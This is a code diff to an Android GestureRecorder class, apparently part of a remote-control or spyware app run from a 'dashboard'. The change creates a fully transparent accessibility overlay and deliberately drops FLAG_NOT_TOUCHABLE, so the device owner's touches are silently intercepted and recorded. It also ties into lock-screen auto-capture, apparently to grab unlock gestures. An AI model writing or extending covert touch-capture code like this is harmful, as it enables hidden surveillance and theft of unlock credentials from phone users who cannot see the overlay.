@@ -523,67 +523,78 @@ public class GestureRecorder {
     }
 
     /**
-     * Start auto-capturing complex gestures via AccessibilityService.onTouchEvent().
-     * No overlay window is created — the user's interaction is never blocked.
-     * Points are collected until stopAutoCapture() is called, then saved.
+     * Start auto-capturing gestures via an invisible (silent) overlay.
+     * Works on ALL Android versions — no dependency on onMotionEvent (API 34+).
+     * The overlay is completely transparent; touches are recorded and NOT
+     * passed through to the underlying app while capture is active.
+     * Call stopAutoCapture() from the dashboard when the gesture is done.
      */
     public JSONObject startAutoCapture() {
         JSONObject r = new JSONObject();
         try {
-            if (autoCapturing) {
-                r.put("success", false); r.put("error", "Auto-capture already running"); return r;
+            if (autoCapturing || isRecording) {
+                r.put("success", false);
+                r.put("error", "Auto-capture already running");
+                return r;
             }
-            synchronized (servicePts) { servicePts.clear(); }
-            servicePtsStart = System.currentTimeMillis();
-            autoCapturing   = true;
+            autoCapturing = true;
+            isRecording   = true;
+            String safeLabel = "auto_" + System.currentTimeMillis();
+            CountDownLatch latch = new CountDownLatch(1);
+            mainHandler.post(() -> {
+                overlay = new RecordingOverlay(
+                        context, "auto", safeLabel, screenW, screenH, wm,
+                        () -> { isRecording = false; autoCapturing = false; });
+                overlay.setSilent(true);
+                try {
+                    overlay.show();
+                } catch (Exception e) {
+                    Log.e(TAG, "startAutoCapture overlay.show: " + e.getMessage());
+                    isRecording   = false;
+                    autoCapturing = false;
+                    overlay = null;
+                }
+                latch.countDown();
+            });
+            latch.await(2, TimeUnit.SECONDS);
+            if (overlay == null) {
+                r.put("success", false);
+                r.put("error", "Failed to create invisible capture overlay");
+                return r;
+            }
             r.put("success", true);
-            r.put("message", "Auto-capture started — recording via accessibility touch events");
+            r.put("message", "Auto-capture started — perform your gesture on the device, then press Stop & Save");
         } catch (Exception e) {
             autoCapturing = false;
+            isRecording   = false;
             try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
         }
         return r;
     }
 
     /**
-     * Stop auto-capture and save captured gestures that are complex enough.
-     * Filters out straight-line swipes and single taps before saving.
+     * Stop auto-capture and save the recorded gesture.
+     * Delegates to stopRecording() which handles the overlay teardown and file save.
      */
     public JSONObject stopAutoCapture() {
         JSONObject r = new JSONObject();
         try {
-            // Always disable lock-screen capture (runs automatically on service connect).
             disableLockScreenAutoCapture();
-
-            if (!autoCapturing) {
-                r.put("success", true);
-                r.put("saved", false);
-                r.put("message", "Auto-capture stopped");
-                return r;
-            }
             autoCapturing = false;
 
-            // Grab whatever was collected and clear the buffer.
-            List<GesturePoint> snapshot;
-            synchronized (servicePts) {
-                snapshot = new ArrayList<>(servicePts);
-                servicePts.clear();
-            }
-
-            if (snapshot.size() < 10) {
+            if (!isRecording || overlay == null) {
                 r.put("success", true);
                 r.put("saved", false);
-                r.put("message", "No complex gestures captured");
+                r.put("message", "Auto-capture stopped (nothing was recording)");
                 return r;
             }
 
-            long durationMs = snapshot.get(snapshot.size() - 1).t - snapshot.get(0).t;
-            JSONObject saved = saveServiceGesturePoints(
-                    snapshot, "auto", "auto_" + System.currentTimeMillis(), durationMs);
+            JSONObject result = stopRecording();
             r.put("success", true);
-            r.put("saved", saved != null);
-            if (saved != null) r.put("result", saved);
-            else r.put("message", "Gesture too simple to save (tap/straight swipe)");
+            boolean hasSaved = result.optBoolean("success", false) && result.has("result");
+            r.put("saved", hasSaved);
+            if (hasSaved) r.put("result", result.get("result"));
+            else          r.put("message", result.optString("message", "Auto-capture stopped"));
         } catch (Exception e) {
             try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
         }
@@ -984,14 +995,12 @@ public class GestureRecorder {
             };
             view.setLayerType(View.LAYER_TYPE_SOFTWARE, null);
 
-            // In silent mode, add FLAG_NOT_TOUCHABLE so the overlay is completely
-            // transparent to user input — the device owner can interact normally.
+            // Silent mode = invisible overlay (nothing drawn) but still touchable so
+            // onTouchEvent fires and gestures are recorded on ALL Android versions.
+            // FLAG_NOT_TOUCHABLE is intentionally NOT set here.
             int flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                         WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                         WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;
-            if (silent) {
-                flags |= WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
-            }
             int fmt = silent ? PixelFormat.TRANSPARENT : PixelFormat.TRANSLUCENT;
 
             // Use TYPE_ACCESSIBILITY_OVERLAY — works without SYSTEM_ALERT_WINDOW when
